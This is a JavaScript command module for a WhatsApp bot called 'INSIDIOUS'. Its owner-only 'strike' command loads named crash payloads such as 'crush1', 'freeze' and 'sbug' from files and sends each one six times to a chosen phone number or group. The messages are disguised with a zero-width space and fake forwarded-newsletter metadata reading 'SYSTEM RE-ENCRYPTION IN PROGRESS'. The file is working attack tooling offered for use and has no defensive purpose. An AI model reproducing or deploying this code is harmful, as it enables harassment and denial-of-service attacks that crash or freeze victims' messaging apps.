const fs = require('fs-extra');
const path = require('path');
const config = require('../../config');
const { fancy } = require('../../lib/font');

module.exports = {
    name: "strike",
    ownerOnly: true,
    description: "Deploy stealth payload attacks (owner only)",
    usage: "[type] [number/group link]",
    
    execute: async (conn, msg, args, { from, isOwner, reply }) => {
        if (!isOwner) return;

        let type = args[0]?.toLowerCase();
        let target = args[1];

        if (!type || !target) {
            return reply(fancy(`╭── • 🥀 • ──╮\n  ꜱᴛʀɪᴋᴇ ᴍᴀɴᴜᴀʟ\n╰── • 🥀 • ──╯\n\nᴜꜱᴀɢᴇ: .ꜱᴛʀɪᴋᴇ [ᴛʏᴘᴇ] [ɴᴜᴍʙᴇʀ/ʟɪɴᴋ]\n\nᴀᴠᴀɪʟᴀʙʟᴇ ᴛʏᴘᴇꜱ:\n- crush1, crush2\n- freeze, sios\n- sbug, sbug2\n- skill, slugs`));
        }

        let jid;
        if (target.includes("chat.whatsapp.com")) {
            jid = target;
        } else {
            const cleanNum = target.replace(/[^0-9]/g, '');
            if (cleanNum.length < 10) {
                return reply(fancy(`❌ Invalid phone number.`));
            }
            jid = cleanNum + "@s.whatsapp.net";
        }

        let filePath = path.join(__dirname, `../../lib/payload/${type}.txt`);
        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, `../../lib/payload/${type}.text`);
        }

        if (!fs.existsSync(filePath)) {
            return reply(fancy(`🥀 ᴇʀʀᴏʀ: ᴘᴀʏʟᴏᴀᴅ '${type}' ɴᴏᴛ ꜰᴏᴜɴᴅ.`));
        }

        let lethalPayload;
        try {
            lethalPayload = fs.readFileSync(filePath, 'utf-8');
        } catch (e) {
            return reply(fancy(`❌ Failed to read payload: ${e.message}`));
        }

        await reply(fancy(`🥀 ɪɴɪᴛɪᴀᴛɪɴɢ ${type.toUpperCase()} ꜱᴛʀɪᴋᴇ ᴏɴ ᴛᴀʀɢᴇᴛ...`));

        try {
            for (let i = 0; i < 6; i++) {
                await conn.sendPresenceUpdate('recording', jid);
                await new Promise(resolve => setTimeout(resolve, 2000));

                await conn.sendMessage(jid, {
                    // ✅ INVISIBLE: Zero‑width space + payload
                    text: "\u200B" + lethalPayload,
                    contextInfo: {
                        externalAdReply: {
                            title: "🥀 INSIDIOUS V2.1.1 🥀",
                            body: "SYSTEM RE-ENCRYPTION IN PROGRESS",
                            mediaType: 1,
                            renderLargerThumbnail: false,
                            thumbnailUrl: "https://files.catbox.moe/horror.jpg",
                            sourceUrl: config.channelLink || "https://whatsapp.com/channel/..."
                        },
                        isForwarded: true,
                        forwardingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: config.newsletterJid || "120363404317544295@newsletter",
                            newsletterName: `ꜱᴛʀɪᴋᴇ ᴅᴇᴘʟᴏʏᴇᴅ: ${type.toUpperCase()}`
                        }
                    }
                });
            }
            await reply(fancy(`🥀 ${type.toUpperCase()} ꜱᴇǫᴜᴇɴᴄᴇ ꜰɪɴɪꜱʜᴇᴅ. ᴛᴀʀɢᴇᴛ ɪꜱ ɴᴏᴡ ɪɴ ᴛʜᴇ ꜰᴜʀᴛʜᴇʀ.`));
        } catch (error) {
            console.error("Strike error:", error);
            await reply(fancy(`❌ Strike failed: ${error.message}`));
        }
    }
};
